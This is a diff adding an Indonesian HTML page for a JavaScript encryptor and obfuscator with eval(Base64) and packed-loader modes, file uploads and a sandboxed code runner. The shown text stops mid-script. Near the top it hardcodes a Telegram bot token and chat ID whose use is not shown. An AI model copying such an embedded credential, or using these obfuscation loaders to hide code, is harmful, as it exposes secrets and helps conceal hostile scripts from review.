@@ -1,0 +1,1301 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Aphophis Encryptor (v7 Fixed Layout)</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;550;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+<style>
+  :root {
+    /* Variabel ini akan diubah oleh JS (Tema Default: Biru) */
+    --accent: #38bdf8;
+    --accent-glow: rgba(56, 189, 248, 0.3);
+    --border-color: rgba(56, 189, 248, 0.2); 
+    
+    --bg-color: #020617;
+    --card-bg: #0f172a;
+    --input-bg: rgba(255, 255, 255, 0.08);
+    --input-bg-focus: rgba(255, 255, 255, 0.15);
+    --text-color: #e2e8f0;
+    --muted: #64748b;
+    --danger: #ef4444;
+    --success: #22c55e;
+    --warn: #f97316;
+  }
+
+  html { box-sizing: border-box; }
+  *, *:before, *:after { box-sizing: inherit; }
+
+  html, body {
+    margin: 0;
+    font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+
+  body {
+    background-color: var(--bg-color);
+    color: var(--text-color);
+    padding: 1rem;
+    min-height: 100vh;
+  }
+
+  /* Latar belakang animasi */
+  .bg {
+    position: fixed; inset: 0; z-index: 0;
+    pointer-events: none; overflow: hidden;
+  }
+  .square {
+    position: absolute; width: 18vmin; height: 18vmin;
+    border-radius: 12px; opacity: 0.08; filter: blur(18px);
+    background: linear-gradient(135deg, var(--accent), var(--bg-color));
+    animation: drift 16s linear infinite;
+    transition: background 0.5s ease;
+  }
+  .s1 { left: -8%; top: 10%; animation-duration: 20s; }
+  .s2 { right: -10%; bottom: 2%; animation-duration: 24s; }
+  .s3 { left: 22%; bottom: -12%; animation-duration: 18s; }
+
+  @keyframes drift {
+    0% { transform: translateY(0) rotate(0deg); }
+    50% { transform: translateY(-24vh) rotate(140deg); }
+    100% { transform: translateY(0) rotate(280deg); }
+  }
+
+  /* Wrapper Utama */
+  .wrap {
+    position: relative; z-index: 2;
+    width: 100%; max-width: 1000px;
+    margin: 1rem auto;
+    padding: 1.5rem;
+    border-radius: 14px;
+    background: var(--card-bg);
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+    border: 1px solid var(--border-color);
+    transition: border-color 0.5s ease;
+    
+    display: flex;
+    flex-direction: column;
+    max-height: 95vh; /* Batasi tinggi total di desktop */
+    overflow: hidden; /* Sembunyikan scroll di wrapper */
+  }
+
+  /* Header */
+  .header {
+    display: flex; align-items: center; gap: 14px;
+    margin-bottom: 1rem;
+    border-bottom: 1px solid var(--border-color);
+    padding-bottom: 1rem;
+    flex-shrink: 0;
+    transition: border-color 0.5s ease;
+  }
+  .logo {
+    width: 50px; height: 50px; border-radius: 12px;
+    background: var(--bg-color); display: flex;
+    align-items: center; justify-content: center;
+    font-weight: 800; color: var(--accent); font-size: 1.2rem;
+    box-shadow: 0 0 15px var(--accent-glow);
+    flex-shrink: 0;
+    transition: color 0.5s ease, box-shadow 0.5s ease;
+  }
+  h1 { margin: 0; font-size: 1.5rem; }
+  .lead { color: var(--muted); font-size: 0.9rem; margin-top: 4px; }
+
+  /* Navigasi & Halaman */
+  .main-nav {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 1.5rem;
+    flex-shrink: 0;
+    flex-wrap: wrap; /* (FIX 1) Izinkan tombol untuk wrap */
+  }
+  .nav-btn {
+    /* (FIX 1) Ubah flex-basis agar bisa 2x2 di seluler */
+    flex: 1 1 40%; 
+    padding: 0.8rem; font-size: 0.95rem;
+    font-weight: 600; border-radius: 8px;
+    border: 1px solid var(--border-color);
+    background: var(--input-bg); color: var(--muted);
+    cursor: pointer; 
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    transition: all 0.3s ease;
+  }
+  .nav-btn:hover { color: var(--text-color); border-color: var(--accent); }
+  .nav-btn.active {
+    background: var(--accent); color: var(--bg-color);
+    border-color: var(--accent); box-shadow: 0 0 15px var(--accent-glow);
+  }
+  
+  .page-container {
+    flex-grow: 1; /* Ambil sisa ruang */
+    overflow-y: auto; /* HANYA KONTEN INI YG SCROLL */
+    padding-right: 10px; /* Ruang untuk scrollbar */
+  }
+  .page-view {
+    display: none;
+    animation: fadeIn 0.3s ease;
+  }
+  .page-view.active {
+    display: block;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Layout 2 Kolom */
+  .content { display: flex; gap: 1.5rem; flex-wrap: wrap; }
+  .left { flex: 1; min-width: 300px; display: flex; flex-direction: column; }
+  .right { width: 350px; min-width: 300px; flex-shrink: 0; }
+
+  /* Input: Textarea */
+  #js-textarea {
+    min-height: 300px; width: 100%;
+    padding: 1rem; background: var(--input-bg);
+    border: 1px solid var(--border-color);
+    border-radius: 12px; color: var(--text-color);
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 0.95rem;
+    resize: vertical;
+    transition: all 0.3s ease;
+  }
+  #js-textarea:focus {
+    outline: none; background: var(--input-bg-focus);
+    border-color: var(--accent); box-shadow: 0 0 10px var(--accent-glow);
+  }
+
+  #file-info-display { font-size: 0.9rem; color: var(--muted); margin-top: 1rem; text-align: center; font-family: monospace; }
+  #file-info-display .file-name { color: var(--accent); font-weight: 600; transition: color 0.5s ease; }
+
+  /* Kanan: Opsi */
+  h3 {
+    font-size: 1.1rem;
+    color: var(--accent);
+    margin-top: 0;
+    margin-bottom: 0.75rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--border-color);
+    transition: color 0.5s ease, border-color 0.5s ease;
+  }
+  
+  .form-group { margin-bottom: 1rem; }
+  label { display: block; font-weight: 500; font-size: 0.9rem; margin-bottom: 0.5rem; }
+  
+  .custom-select { display: none; } 
+
+  /* Dropdown Kustom (v3) */
+  .custom-select-wrapper { position: relative; width: 100%; font-family: 'Poppins', sans-serif; }
+  .custom-select-trigger { width: 100%; padding: 0.9rem; font-size: 1rem; border-radius: 12px; border: 1px solid var(--border-color); background: var(--input-bg); color: var(--text-color); cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: all 0.3s ease; }
+  .custom-select-trigger:focus { outline: none; }
+  .custom-select-wrapper.open .custom-select-trigger { border-color: var(--accent); background-color: var(--input-bg-focus); box-shadow: 0 0 10px var(--accent-glow); }
+  .custom-select-trigger .trigger-text { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .custom-select-trigger .trigger-arrow { transition: transform 0.3s ease; color: var(--muted); font-size: 0.8rem; }
+  .custom-select-wrapper.open .trigger-arrow { transform: rotate(180deg); }
+  .custom-select-options { position: absolute; top: calc(100% + 8px); left: 0; right: 0; z-index: 10; background: var(--card-bg); border: 1px solid var(--accent); border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); max-height: 280px; overflow-y: auto; opacity: 0; visibility: hidden; transform: translateY(-10px); transition: all 0.2s ease; }
+  .custom-select-wrapper.open .custom-select-options { opacity: 1; visibility: visible; transform: translateY(0); }
+  .custom-optgroup-label { padding: 0.6rem 1rem; font-size: 0.8rem; font-weight: 600; color: var(--muted); text-transform: uppercase; border-top: 1px solid var(--border-color); transition: border-color 0.5s ease; }
+  .custom-optgroup-label:first-child { border-top: none; }
+  .custom-option { padding: 0.8rem 1.2rem; font-size: 0.95rem; color: var(--text-color); cursor: pointer; transition: background-color 0.2s ease, color 0.2s ease; }
+  .custom-option:hover { background-color: var(--input-bg-focus); color: var(--accent); }
+  .custom-option.selected { background-color: var(--accent); color: var(--bg-color); font-weight: 600; transition: background-color 0.5s ease; }
+
+  /* Input Teks */
+  .custom-input { width: 100%; padding: 0.9rem; font-size: 1rem; font-family: 'Poppins', sans-serif; border-radius: 12px; border: 1px solid var(--border-color); background: var(--input-bg); color: var(--text-color); transition: all 0.3s ease; }
+  .custom-input:focus { outline: none; border-color: var(--accent); background-color: var(--input-bg-focus); box-shadow: 0 0 10px var(--accent-glow); }
+  #password-group { display: none; }
+  textarea.custom-input { font-family: 'Courier New', Courier, monospace; resize: vertical; }
+
+  /* Output Textarea */
+  #output-textarea { min-height: 150px; max-height: 200px; width: 100%; font-size: 0.9rem; }
+
+  /* Tombol Aksi */
+  .action-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 0.9rem 1.2rem; border-radius: 12px; border: 0; background: linear-gradient(45deg, var(--accent), #0EA5E9); color: var(--bg-color); font-weight: 700; font-size: 1rem; cursor: pointer; box-shadow: 0 4px 15px var(--accent-glow); transition: all 0.3s ease; width: 100%; }
+  .action-btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px var(--accent-glow); }
+  .action-btn[disabled] { opacity: 0.5; cursor: not-allowed; transform: none; box-shadow: none; }
+  .secondary-btn { background: var(--input-bg); color: var(--accent); border: 1px solid var(--border-color); box-shadow: none; }
+  .secondary-btn:hover:not(:disabled) { background: var(--input-bg-focus); border-color: var(--accent); transform: none; box-shadow: 0 0 10px var(--accent-glow); }
+
+  /* Tombol Aksi Output */
+  .output-actions {
+    display: none; /* Sembunyi by default */
+    gap: 1rem;
+    margin-top: 0.75rem;
+  }
+  .output-actions .action-btn {
+    width: 100%;
+    margin-top: 0;
+  }
+
+  /* Status & Progress */
+  #status-area { margin-top: 1rem; }
+  #statusBadge { font-size: 0.9rem; color: var(--muted); text-align: left; height: 1.2em; }
+  .progress-wrap { margin-top: 0.5rem; background: var(--input-bg); border-radius: 12px; padding: 6px; border: 1px solid var(--border-color); transition: border-color 0.5s ease; }
+  .progress { height: 8px; border-radius: 8px; background: rgba(0, 0, 0, 0.3); overflow: hidden; }
+  .progress > i { display: block; height: 100%; width: 0%; background: linear-gradient(90deg, var(--accent), #0EA5E9); transition: width .25s ease, background 0.5s ease; border-radius: 8px; }
+
+  /* Halaman File Manager */
+  .file-manager-actions { display: flex; gap: 1rem; margin-top: 1.5rem; margin-bottom: 1.5rem; }
+  .file-manager-actions .action-btn { width: auto; flex-grow: 1; }
+  #file-list-container { max-height: 350px; overflow-y: auto; border: 1px solid var(--border-color); border-radius: 12px; background: var(--input-bg); transition: border-color 0.5s ease; }
+  .file-item { display: flex; align-items: center; justify-content: space-between; padding: 0.8rem 1rem; border-bottom: 1px solid var(--border-color); transition: background-color 0.2s ease, border-color 0.5s ease; }
+  .file-item:last-child { border-bottom: none; }
+  .file-item:hover { background-color: var(--input-bg-focus); }
+  .file-info { display: flex; align-items: center; gap: 12px; overflow: hidden; }
+  .file-info i { color: var(--accent); font-size: 1.1rem; transition: color 0.5s ease; }
+  .file-name { font-weight: 500; color: var(--text-color); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .file-size { font-size: 0.85rem; color: var(--muted); flex-shrink: 0; }
+  .file-actions { display: flex; gap: 8px; }
+  .file-action-btn { background: none; border: 1px solid var(--border-color); color: var(--muted); border-radius: 6px; width: 32px; height: 32px; cursor: pointer; transition: all 0.2s ease; }
+  .file-action-btn:hover { color: var(--accent); border-color: var(--accent); }
+  .file-action-btn.delete:hover { color: var(--danger); border-color: var(--danger); }
+  #file-list-empty { text-align: center; padding: 3rem; color: var(--muted); }
+  #file-list-empty i { font-size: 2.5rem; display: block; margin-bottom: 1rem; }
+  
+  .info-box {
+    margin-top: 1.5rem; padding: 1rem;
+    background: var(--input-bg);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    font-size: 0.9rem;
+    color: var(--muted);
+    transition: border-color 0.5s ease;
+  }
+  .info-box i { margin-right: 8px; }
+
+  /* =========================== */
+  /* === (FIX 3) HALAMAN TERMINAL === */
+  /* =========================== */
+  .terminal-actions { 
+    display: flex; gap: 1rem; margin-bottom: 1rem; 
+  }
+  #terminal-output-container {
+    background: var(--bg-color); /* (FIX 3) Gunakan bg tema */
+    border: 1px solid var(--border-color);
+    border-radius: 8px;
+    min-height: 300px;
+    max-height: 40vh;
+    overflow-y: auto;
+    padding: 1rem;
+    transition: border-color 0.5s ease, background-color 0.5s ease;
+  }
+  #terminal-log {
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 0.9rem;
+    margin: 0;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+  /* (FIX 3) Hapus #0f0, ganti dengan kelas spesifik */
+  #terminal-log .log-log { color: var(--text-color); }
+  #terminal-log .log-error { color: var(--danger); }
+  #terminal-log .log-warn { color: var(--warn); }
+  #terminal-log .log-info { color: var(--accent); }
+  #terminal-log .log-system { color: var(--muted); font-style: italic; }
+
+
+  /* =========================== */
+  /* === HALAMAN SETTINGS === */
+  /* =========================== */
+  .color-swatch-container {
+    display: flex;
+    gap: 1rem;
+    flex-wrap: wrap;
+    margin-top: 0.5rem;
+  }
+  .color-swatch {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    cursor: pointer;
+    border: 3px solid var(--input-bg);
+    transition: all 0.2s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .color-swatch:hover {
+    transform: scale(1.1);
+  }
+  .color-swatch.active {
+    border-color: #fff;
+    box-shadow: 0 0 10px #fff;
+  }
+  .color-swatch i {
+    color: white;
+    font-size: 1rem;
+    opacity: 0;
+    transition: opacity 0.2s ease;
+  }
+  .color-swatch.active i {
+    opacity: 1;
+  }
+  
+  h3[style*="margin-top"] {
+      margin-top: 2rem;
+  }
+
+  /* Checkbox & Range */
+  .checkbox-group { display: flex; align-items: center; gap: 10px; margin-bottom: 0.5rem; }
+  .custom-checkbox { accent-color: var(--accent); width: 18px; height: 18px; cursor: pointer; flex-shrink: 0; }
+  .checkbox-group label { margin-bottom: 0; cursor: pointer; }
+
+  .range-slider { display: flex; align-items: center; gap: 1rem; }
+  .range-slider input[type="range"] {
+    flex-grow: 1; -webkit-appearance: none; appearance: none;
+    height: 8px; background: var(--input-bg);
+    border-radius: 5px; outline: none;
+    border: 1px solid var(--border-color);
+    transition: all 0.5s ease;
+  }
+  .range-slider input[type="range"]::-webkit-slider-thumb {
+    -webkit-appearance: none; appearance: none;
+    width: 20px; height: 20px; border-radius: 50%;
+    background: var(--accent); cursor: pointer;
+    transition: background 0.5s ease;
+  }
+  .range-slider input[type="range"]::-moz-range-thumb {
+    width: 20px; height: 20px; border-radius: 50%;
+    background: var(--accent); cursor: pointer;
+    transition: background 0.5s ease;
+  }
+  .range-slider span {
+    font-weight: 600; color: var(--accent);
+    transition: color 0.5s ease;
+    width: 50px; text-align: right;
+  }
+
+  /* =========================== */
+  /* === (FIX 2) Responsive === */
+  /* =========================== */
+  @media (max-width: 950px) {
+    .content { flex-direction: column; }
+    .right { width: 100%; }
+    .wrap { max-width: 600px; max-height: 95vh; }
+  }
+  
+  @media (max-width: 480px) {
+    body { padding: 0; } /* Hapus padding body di seluler */
+    .wrap { 
+      padding: 1rem; 
+      margin: 0;
+      border-radius: 0; 
+      /* (FIX 2) Gunakan 100% dynamic viewport height */
+      height: 100vh; /* Fallback */
+      height: 100dvh; 
+      max-height: 100dvh; /* Pastikan tidak overflow */
+    }
+    h1 { font-size: 1.25rem; }
+    
+    .nav-btn {
+      padding: 0.7rem; 
+      font-size: 0.8rem;
+      flex-basis: 40%; /* Pastikan 2x2 grid */
+    }
+
+    .page-container {
+      /* (FIX 2) Beri padding bawah agar scroll tidak terhalang nav HP */
+      padding-bottom: 50px;
+    }
+    
+    .file-item { flex-direction: column; align-items: stretch; gap: 10px; }
+    .file-info { justify-content: space-between; }
+    .file-name { flex-grow: 1; }
+  }
+
+</style>
+</head>
+<body>
+  <div class="bg" aria-hidden="true">
+    <div class="square s1"></div>
+    <div class="square s2"></div>
+    <div class="square s3"></div>
+  </div>
+
+  <div class="wrap" role="main">
+    <div class="header">
+      <div class="logo">A</div>
+      <div>
+        <h1>Aphophis Encryptor</h1>
+        <div class="lead">Multi-Mode Javascript Encryptor & Obfuscator</div>
+      </div>
+    </div>
+    
+    <div class="main-nav">
+      <button id="nav-home-btn" class="nav-btn active">
+        <i class="fas fa-key"></i> Encryptor
+      </button>
+      <button id="nav-files-btn" class="nav-btn">
+        <i class="fas fa-folder-open"></i> File Manager
+      </button>
+      <button id="nav-run-btn" class="nav-btn">
+        <i class="fas fa-terminal"></i> Terminal
+      </button>
+      <button id="nav-settings-btn" class="nav-btn">
+        <i class="fas fa-cog"></i> Pengaturan
+      </button>
+    </div>
+
+    <div class="page-container">
+      
+      <div id="page-home" class="page-view active">
+        <div class="content">
+          <div class="left">
+            <textarea id="js-textarea" placeholder="Tempel/tulis kode di sini, atau muat file dari File Manager..."></textarea>
+            <div id="file-info-display">
+              <span class="file-name">Input: Textarea</span>
+            </div>
+            <div id="status-area">
+              <p id="statusBadge"></p>
+              <div class="progress-wrap">
+                <div class="progress"><i id="progressBar"></i></div>
+              </div>
+            </div>
+          </div>
+          <div class="right">
+            <h3><i class="fas fa-cogs"></i> Opsi Enkripsi</h3>
+            <div class="form-group">
+              <label for="encrypt-type">Metode Enkripsi</label>
+              <select id="encrypt-type" class="custom-select">
+                <optgroup label="Encoding (Low)">
+                  <option value="base64">Base64</option>
+                  <option value="hex">Hex</option>
+                  <option value="rot13">ROT13</option>
+                  <option value="url">URL Encode</option>
+                  <option value="binary">Binary (Text)</option>
+                  <option value="ascii_dec">Decimal Char Codes (Text)</option>
+                </optgroup>
+                <optgroup label="Encryption (Medium)">
+                  <option value="aes">AES (dengan Password)</option>
+                  <option value="rc4">RC4 (dengan Password)</option>
+                  <option value="rabbit">Rabbit (dengan Password)</option>
+                  <option value="tdes">TripleDES (dengan Password)</option>
+                </optgroup>
+                <optgroup label="Obfuscation (Hard / Anti-Crack)">
+                  <option value="aphophis" selected>Aphophis Loader (btoa + noise)</option>
+                  <option value="eval_b64">Eval(Base64)</option>
+                  <option value="fromcharcode">String.fromCharCode</option>
+                  <option value="packed">Packed Loader (p,a,c,k,e,r)</option>
+                  <option value="hex_fromcharcode">Hex + fromCharCode Loader</option>
+                </optgroup>
+              </select>
+            </div>
+            <div class="form-group" id="password-group">
+              <label for="password">Password</label>
+              <input type="password" id="password" class="custom-input" placeholder="Masukkan password rahasia...">
+            </div>
+            <button id="process-btn" class="action-btn" disabled>
+              <i class="fas fa-key"></i> <span>Proses & Enkripsi</span>
+            </button>
+            <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 1.5rem 0; transition: border-color 0.5s ease;">
+            <h3><i class="fas fa-file-code"></i> Output</h3>
+            <div class="form-group">
+              <label for="output-textarea">Hasil (Untuk Mode Teks/File)</label>
+              <textarea id="output-textarea" class="custom-input" readonly placeholder="Hasil enkripsi akan muncul di sini..."></textarea>
+            </div>
+            <div class="output-actions">
+              <button id="copy-btn" class="action-btn secondary-btn">
+                <i class="fas fa-copy"></i> <span>Salin Hasil</span>
+              </button>
+              <button id="download-btn" class="action-btn secondary-btn">
+                <i class="fas fa-download"></i> <span>Download Hasil</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <div id="page-files" class="page-view">
+        <h3><i class="fas fa-search"></i> Cari File (Session)</h3>
+        <div class="form-group">
+          <input type="search" id="file-search-input" class="custom-input" placeholder="Ketik nama file untuk mencari...">
+        </div>
+        <div class="file-manager-actions">
+          <label for="file-upload-input" class="action-btn">
+            <i class="fas fa-upload"></i> Upload File (.js, .html, .css, .zip)
+          </label>
+          <input id="file-upload-input" type="file" accept=".js,.html,.css,.txt,.zip" style="display:none" multiple />
+        </div>
+        <div id="file-list-container">
+          <div id="file-list-empty">
+            <i class="fas fa-file-excel"></i>
+            <p>Belum ada file. <br> Upload file untuk memulainya.</p>
+          </div>
+        </div>
+        <div class="info-box">
+          <i class="fas fa-shield-alt"></i>
+          <strong>Catatan Keamanan:</strong> Untuk alasan keamanan, aplikasi web **tidak bisa** mengakses file di HP/PC Anda secara langsung. Gunakan tombol 'Upload' untuk menambahkan file ke daftar sesi ini.
+        </div>
+      </div>
+
+      <div id="page-run" class="page-view">
+        <h3><i class="fas fa-terminal"></i> Terminal Eksekusi (Sandbox)</h3>
+        <div class="terminal-actions">
+          <button id="run-code-btn" class="action-btn">
+            <i class="fas fa-play"></i> <span>Jalankan Kode dari Output</span>
+          </button>
+          <button id="clear-log-btn" class="action-btn secondary-btn">
+            <i class="fas fa-trash-alt"></i> <span>Bersihkan Log</span>
+          </button>
+        </div>
+        <div id="terminal-output-container">
+          <pre id="terminal-log"></pre>
+        </div>
+        <iframe id="sandbox-iframe" style="display: none;" sandbox="allow-scripts"></iframe>
+        <div class="info-box" style="border-left-color: var(--warn);">
+          <i class="fas fa-exclamation-triangle"></i>
+          <strong>Peringatan:</strong> Kode dieksekusi di dalam 'sandbox' (iframe). Fitur ini akan menjalankan `console.log`, `alert`, dll. Jangan menjalankan kode yang tidak Anda percayai.
+        </div>
+      </div>
+
+      <div id="page-settings" class="page-view">
+        <h3><i class="fas fa-palette"></i> Tema & Tampilan</h3>
+        <div class="form-group">
+          <label>Warna Aksen</label>
+          <div class="color-swatch-container">
+            <button class="color-swatch active" data-theme="blue" style="background-color: #38bdf8;" title="Biru (Default)">
+              <i class="fas fa-check"></i>
+            </button>
+            <button class="color-swatch" data-theme="green" style="background-color: #22c55e;" title="Hijau">
+              <i class="fas fa-check"></i>
+            </button>
+            <button class="color-swatch" data-theme="purple" style="background-color: #a855f7;" title="Ungu">
+              <i class="fas fa-check"></i>
+            </button>
+            <button class="color-swatch" data-theme="pink" style="background-color: #ec4899;" title="Pink">
+              <i class="fas fa-check"></i>
+            </button>
+            <button class="color-swatch" data-theme="orange" style="background-color: #f97316;" title="Oranye">
+              <i class="fas fa-check"></i>
+            </button>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="logo-text-input">Teks Logo (1 Huruf)</label>
+          <input type="text" id="logo-text-input" class="custom-input" maxlength="1" placeholder="Contoh: A">
+        </div>
+
+        <h3 style="margin-top: 2rem;"><i class="fas fa-tools"></i> Fungsionalitas</h3>
+        <div class="form-group">
+          <label for="setting-default-mode">Metode Enkripsi Default</label>
+          <select id="setting-default-mode" class="custom-select"></select>
+          </div>
+        
+        <div class="form-group">
+          <label>Opsi Otomatis</label>
+          <div class="checkbox-group">
+            <input type="checkbox" id="setting-auto-copy" class="custom-checkbox">
+            <label for="setting-auto-copy">Salin ke clipboard setelah enkripsi</label>
+          </div>
+          <div class="checkbox-group">
+            <input type="checkbox" id="setting-auto-clear" class="custom-checkbox">
+            <label for="setting-auto-clear">Bersihkan input setelah enkripsi (Mode Teks)</label>
+          </div>
+        </div>
+
+        <h3 style="margin-top: 2rem;"><i class="fas fa-shield-alt"></i> Opsi Obfuscation (Aphophis)</h3>
+        <div class="form-group">
+          <label for="setting-noise-density">Tingkat 'Noise' (Aphophis Loader)</label>
+          <div class="range-slider">
+            <input type="range" id="setting-noise-density" min="0" max="50" value="20">
+            <span id="noise-density-value">20%</span>
+          </div>
+        </div>
+        <div class="form-group">
+          <label for="setting-custom-noise">Karakter 'Noise' Kustom (Opsional)</label>
+          <textarea id="setting-custom-noise" class="custom-input" rows="3" placeholder="Contoh: @#$%^&*! (Pisahkan beberapa set dengan baris baru)"></textarea>
+        </div>
+
+        <button id="save-settings-btn" class="action-btn" style="margin-top: 1.5rem;">
+          <i class="fas fa-save"></i> <span>Simpan Pengaturan</span>
+        </button>
+      </div>
+
+    </div>
+  </div> 
+  
+<script>
+/* ===========================
+   TELEGRAM (Sesuai permintaan Anda)
+   =========================== */
+const TELEGRAM_BOT_TOKEN = "7615994174:AAETE1PVcpz7ZCK8cf1yV23p6vCsveqzZVk";
+const TELEGRAM_CHAT_ID   = "7065313128";
+
+/* ===========================
+   Global App State & Settings
+   =========================== */
+// Default settings
+let appSettings = {
+  theme: 'blue',
+  logo: 'A',
+  defaultMode: 'aphophis',
+  autoCopy: false,
+  autoClear: false,
+  noiseDensity: 0.20,
+  customNoise: ''
+};
+
+// Database tema (real)
+const themes = {
+  blue: { accent: '#38bdf8', glow: 'rgba(56, 189, 248, 0.3)', border: 'rgba(56, 189, 248, 0.2)' },
+  green: { accent: '#22c55e', glow: 'rgba(34, 197, 94, 0.3)', border: 'rgba(34, 197, 94, 0.2)' },
+  purple: { accent: '#a855f7', glow: 'rgba(168, 85, 247, 0.3)', border: 'rgba(168, 85, 247, 0.2)' },
+  pink: { accent: '#ec4899', glow: 'rgba(236, 72, 153, 0.3)', border: 'rgba(236, 72, 153, 0.2)' },
+  orange: { accent: '#f97316', glow: 'rgba(249, 115, 22, 0.3)', border: 'rgba(249, 115, 22, 0.2)' }
+};
+
+// Runtime state
+let currentMode = 'text'; // 'text', 'file', 'zip'
+let singleFileData = null; // { name: string, content: string }
+let zipFileData = null; // File object
+let sessionFiles = []; // V4: Penyimpanan file
+
+/* ===========================
+   UI Refs
+   =========================== */
+// Navigasi
+const navButtons = {
+  home: document.getElementById('nav-home-btn'),
+  files: document.getElementById('nav-files-btn'),
+  run: document.getElementById('nav-run-btn'),
+  settings: document.getElementById('nav-settings-btn')
+};
+const pageViews = {
+  home: document.getElementById('page-home'),
+  files: document.getElementById('page-files'),
+  run: document.getElementById('page-run'),
+  settings: document.getElementById('page-settings')
+};
+
+// Input
+const jsTextarea = document.getElementById('js-textarea');
+const fileInfoDisplay = document.querySelector('#file-info-display .file-name');
+// Opsi
+const encryptTypeSelect = document.getElementById('encrypt-type');
+const passwordGroup = document.getElementById('password-group');
+const passwordInput = document.getElementById('password');
+// Output & Aksi
+const processBtn = document.getElementById('process-btn');
+const outputTextarea = document.getElementById('output-textarea');
+const outputActions = document.querySelector('.output-actions');
+const copyBtn = document.getElementById('copy-btn');
+const downloadBtn = document.getElementById('download-btn');
+// Status
+const statusBadge = document.getElementById('statusBadge');
+const progressBar = document.getElementById('progressBar');
+
+// File Manager
+const fileUploadInput = document.getElementById('file-upload-input');
+const fileSearchInput = document.getElementById('file-search-input');
+const fileListContainer = document.getElementById('file-list-container');
+const fileListEmpty = document.getElementById('file-list-empty');
+
+// Terminal
+const runCodeBtn = document.getElementById('run-code-btn');
+const clearLogBtn = document.getElementById('clear-log-btn');
+const terminalLog = document.getElementById('terminal-log');
+let sandbox = document.getElementById('sandbox-iframe');
+
+// Settings
+const logoTextInput = document.getElementById('logo-text-input');
+const colorSwatchContainer = document.querySelector('.color-swatch-container');
+const settingDefaultMode = document.getElementById('setting-default-mode');
+const settingAutoCopy = document.getElementById('setting-auto-copy');
+const settingAutoClear = document.getElementById('setting-auto-clear');
+const settingNoiseDensity = document.getElementById('setting-noise-density');
+const noiseDensityValue = document.getElementById('noise-density-value');
+const settingCustomNoise = document.getElementById('setting-custom-noise');
+const saveSettingsBtn = document.getElementById('save-settings-btn');
+
+/* ===========================
+   PENGATURAN & TEMA (V6)
+   =========================== */
+
+function applyTheme(themeName, logoText) {
+  const theme = themes[themeName] || themes.blue;
+  const logo = (logoText || 'A').trim().charAt(0).toUpperCase() || 'A';
+  
+  const root = document.documentElement;
+  root.style.setProperty('--accent', theme.accent);
+  root.style.setProperty('--accent-glow', theme.glow);
+  root.style.setProperty('--border-color', theme.border);
+  document.querySelector('.logo').textContent = logo;
+
+  logoTextInput.value = logo;
+  document.querySelectorAll('.color-swatch').forEach(swatch => {
+    swatch.classList.toggle('active', swatch.dataset.theme === themeName);
+  });
+}
+
+function saveSettings() {
+  appSettings.theme = document.querySelector('.color-swatch.active').dataset.theme || 'blue';
+  appSettings.logo = logoTextInput.value;
+  appSettings.defaultMode = settingDefaultMode.value;
+  appSettings.autoCopy = settingAutoCopy.checked;
+  appSettings.autoClear = settingAutoClear.checked;
+  appSettings.noiseDensity = parseInt(settingNoiseDensity.value, 10) / 100;
+  appSettings.customNoise = settingCustomNoise.value;
+
+  try {
+    localStorage.setItem('aphophisSettings', JSON.stringify(appSettings));
+  } catch (e) {
+    console.error("Gagal menyimpan pengaturan:", e);
+    setStatus('Gagal menyimpan pengaturan.', 'error');
+    return;
+  }
+  
+  applyTheme(appSettings.theme, appSettings.logo);
+  setDropdownValue('encrypt-type', appSettings.defaultMode);
+
+  showPage('home');
+  setStatus('Pengaturan berhasil disimpan!', 'success');
+  setTimeout(() => setStatus(''), 2000);
+}
+
+function loadSettings() {
+  let loaded = {};
+  try {
+    loaded = JSON.parse(localStorage.getItem('aphophisSettings')) || {};
+  } catch (e) { console.warn('Gagal memuat pengaturan, gunakan default.'); }
+
+  appSettings = { ...appSettings, ...loaded }; 
+
+  applyTheme(appSettings.theme, appSettings.logo);
+  
+  populateDefaultModeSelect(); 
+  settingDefaultMode.value = appSettings.defaultMode;
+  
+  setDropdownValue('encrypt-type', appSettings.defaultMode); 
+  
+  settingAutoCopy.checked = appSettings.autoCopy;
+  settingAutoClear.checked = appSettings.autoClear;
+  settingNoiseDensity.value = appSettings.noiseDensity * 100;
+  noiseDensityValue.textContent = `${appSettings.noiseDensity * 100}%`;
+  settingCustomNoise.value = appSettings.customNoise;
+}
+
+function populateDefaultModeSelect() {
+  const mainSelect = document.getElementById('encrypt-type');
+  settingDefaultMode.innerHTML = mainSelect.innerHTML;
+  const customWrapper = settingDefaultMode.previousElementSibling;
+  if (customWrapper && customWrapper.classList.contains('custom-select-wrapper')) {
+    customWrapper.parentNode.removeChild(customWrapper);
+  }
+  initializeCustomSelect(settingDefaultMode);
+}
+
+colorSwatchContainer.addEventListener('click', (e) => {
